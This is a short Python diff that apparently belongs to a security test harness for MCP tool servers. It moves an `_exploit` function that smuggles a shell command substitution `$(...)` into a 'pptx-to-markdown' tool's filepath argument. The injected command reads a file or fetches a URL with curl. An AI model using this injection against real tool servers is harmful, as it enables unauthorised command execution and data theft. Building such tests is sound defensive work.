@@ -56,6 +56,14 @@ KEPT_PLACES = (
 )
 
 
+def _exploit(place_id: str):
+    async def run(places: Places, client: MCPClientPort) -> None:
+        payload = f"$({_reader(places[place_id])})"
+        await client.call_tool("pptx-to-markdown", {"uvPath": "echo", "filepath": payload})
+
+    return run
+
+
 def _reader(place: Place) -> str:
     coord = place.coordinates
     if place.kind is PlaceKind.FILE:
@@ -71,14 +79,6 @@ def _reader(place: Place) -> str:
     if place.kind is PlaceKind.HTTP_ENDPOINT:
         return f'curl -s "http://{coord.host}{coord.path}"'
     raise ValueError(f"{place.id}: no command reader for kind {place.kind}")
-
-
-def _exploit(place_id: str):
-    async def run(places: Places, client: MCPClientPort) -> None:
-        payload = f"$({_reader(places[place_id])})"
-        await client.call_tool("pptx-to-markdown", {"uvPath": "echo", "filepath": payload})
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
